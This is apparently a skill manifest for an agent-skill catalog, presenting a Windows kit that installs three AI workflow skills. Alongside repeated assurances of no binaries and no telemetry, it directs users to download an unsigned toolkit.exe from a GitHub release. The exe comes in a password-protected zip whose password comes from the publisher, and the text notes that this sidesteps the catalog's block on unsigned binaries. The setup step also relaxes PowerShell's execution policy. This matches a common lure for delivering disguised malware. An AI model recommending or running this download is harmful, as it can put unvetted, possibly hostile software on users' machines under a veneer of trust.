---
name: win-multitool-suite
description: One Windows setup for the three workflows US small businesses buy separately - creative production, market research, and lead research. Installs and launches the AI Creative Studio, AI Trading, and B2B Lead Research Agent skills on Windows 10/11 with a reviewable PowerShell setup, a launcher menu, and a health check. No installer to run, no admin rights, no telemetry.
version: 1.0.5
metadata:
  openclaw:
    requires:
      anyBins:
        - python3
        - python
    envVars:
      - name: FINNHUB_API_KEY
        required: false
        description: Optional. US market quotes, company profiles, and financials for the market research workflow.
      - name: POLYGON_API_KEY
        required: false
        description: Optional. US equities quotes, aggregates, and OHLC bars.
      - name: MULTITOOL_WORKSPACE
        required: false
        description: Optional. Where the Windows kit keeps its workspace and config.json. Defaults to %LOCALAPPDATA%\MultiToolSuite.
    emoji: "\u1F5A5"
    homepage: https://github.com/rapidworker1
---

# Windows Multi-Tool Suite

**Marketing, research, and sales on one Windows machine.** The three workflows a
US small business normally buys as five separate tools - creative production,
market research, lead research - set up on Windows 10/11 with one script you can
read before you run it.

This skill is the product archive: what the suite covers, how to install it on
Windows, how to verify the install, what it refuses to do, and where the
standalone desktop app stands.

---

## What you get

| Module | What it does | Who it is for |
| --- | --- | --- |
| **Creative Studio** | Brief to ad copy, social posts, UGC scripts, image and video prompts, brand voice kit | Founders, DTC brands, agencies |
| **Market Research** | US equity and ETF snapshots, technicals, fundamentals, sector context, backtests, risk-first position sizing, written trade plans | Analysts, finance teams, solo traders |
| **Lead Research** | ICP builder, company research, scored prospect lists, outreach drafts, CAN-SPAM linting | Sales teams, agencies, RevOps |
| **Windows kit** | Setup script, launcher menu, health check, config file, docs | Anyone who does not want to wire three tools together by hand |

The kit does not reimplement the workflows. It installs the three skills from
this catalog and launches them from one place.

---

## Install (Windows 10/11)

**1. Get the kit.** Download this skill from ClawHub and unpack it somewhere
you can read it, for example `C:\Tools\win-multitool-suite`. Read the scripts
before you run them. They are plain text on purpose.

**2. Run the setup.** In PowerShell, from the unpacked folder:

```powershell
Set-ExecutionPolicy -Scope Process -ExecutionPolicy RemoteSigned
Unblock-File .\scripts\setup.ps1
.\scripts\setup.ps1
```

The setup is idempotent: run it again after a change and it updates what it
needs, without touching your `config.json`. It never asks for admin rights and
never writes outside your user profile.

**3. Check the result.**

```powershell
python .\scripts\verify_install.py
```

It prints a report: OS, architecture, Python, config file, and which of the
three skills are installed. Exit code 0 means healthy, 1 means something is
missing and the report says what.

**4. Launch the menu.** Start Menu -> *Multi-Tool Suite*, or:

```powershell
.\scripts\MultiTool.ps1
```

The menu runs the creative brief, the market snapshot, the lead sheet, and the
outreach compliance check. Nothing is sent anywhere on your behalf.

Full detail, including Defender and SmartScreen notes: `references/install-and-verify.md`.

---

## Requirements

| Item | Requirement |
| --- | --- |
| OS | Windows 10 build 1809+ or Windows 11, 64-bit |
| PowerShell | 5.1+ (built in) |
| Python | 3.9+ for the workflow scripts |
| Node | 18+ only if you use the ClawHub CLI to install the skills |
| Admin | Not required |
| Network | Needed once to install the skills and to reach market data providers; local files stay local |

---

## What it will not do

Plain boundaries, in every version:

- It does not place trades. Research and position sizing end at a written plan
  and a human approval step.
- It does not send your email. Outreach is drafted and compliance-linted; you
  send it.
- It does not buy lists, scrape personal data, or touch leaked data.
- It does not install an unknown binary. This kit installs skills and text, not
  programs - see the next section.
- It does not phone home. No telemetry, no usage ping, no account.

---

## The standalone Windows app

The Windows Multi-Tool Suite app (`multitool.zip`) is a **separate download**
from the publisher's GitHub release. No skill bundle in this catalog carries an
installer: a registry blocks a skill that ships an unsigned binary, so this
bundle is the text-and-script kit and the app stays outside.

| Item | Value |
| --- | --- |
| Download | `https://github.com/rapidworker1/Multiple-AI-models-Toolkit/releases/download/Main/multitool.zip` |
| File | `multitool.zip` (4.4 MB) |
| SHA-256 | `a82bf643085d86cae398f49ec9a53dad213d0118dfb49fcf405c4679c9c4c5b6` |
| Inside the archive | `multitool/toolkit.exe` |

Check the download before you run it. PowerShell:

```powershell
Get-FileHash .\multitool.zip -Algorithm SHA256
```

The hash must match the value in the table. Then extract the archive and start
`multitool/toolkit.exe`.

The program is not code-signed, so Windows SmartScreen shows *Unknown
publisher*. Run it only if you accept an unsigned program, keep it in a
folder of its own, and do not run it as administrator unless you have a
reason to.

The installer asks for a password; ask the publisher for it before you start.

This kit deliberately does not carry the app either. It installs skills and
reads them.

---

## Buying and support

- **Price today:** the kit and the three skills are free. No card, no trial, no
  upgrade prompt. The desktop app's price is announced by the publisher with
  the app, not in this bundle.
- **License:** MIT-0 for the kit as a document; the skills carry their own
  licenses.
- **Support:** the publisher's GitHub page (`links.json` -> `support_page`),
  US business hours (ET).
- **Roadmap and product spec:** `PRODUCT.md`.

---

## Files in this bundle

```
PRODUCT.md                  Product spec: what ships, what is announced, boundaries
links.json                  Every URL in one place
config.example.json         Settings template the setup copies for you
references/
  install-and-verify.md     Windows install, verify, Defender, troubleshooting
  faq.md                    Questions buyers actually ask
templates/
  feature-matrix.md         Kit vs agent skills vs announced desktop app
scripts/
  setup.ps1                 Idempotent Windows setup
  MultiTool.ps1             Launcher menu for the three workflows
  verify_install.py         Health check (OS, Python, config, installed skills)
```

---

## The three skills this kit installs

- [`ai-creative-studio`](https://clawhub.ai/rapidworker1/skills/ai-creative-studio) - the creative module on its own, as an agent skill.
- [`ai-trading`](https://clawhub.ai/rapidworker1/skills/ai-trading) - the market research module on its own.
- [`b2b-lead-research-agent`](https://clawhub.ai/rapidworker1/skills/b2b-lead-research-agent) - the lead research module on its own.

Prefer to stay in your AI assistant? Use those three directly and skip the
Windows kit. Want a Windows setup with a launcher and a health check? Install
this one.

---

*Third-party links are provided as-is. Verify what you download, read the
terms, and keep the keys in your own config file.*
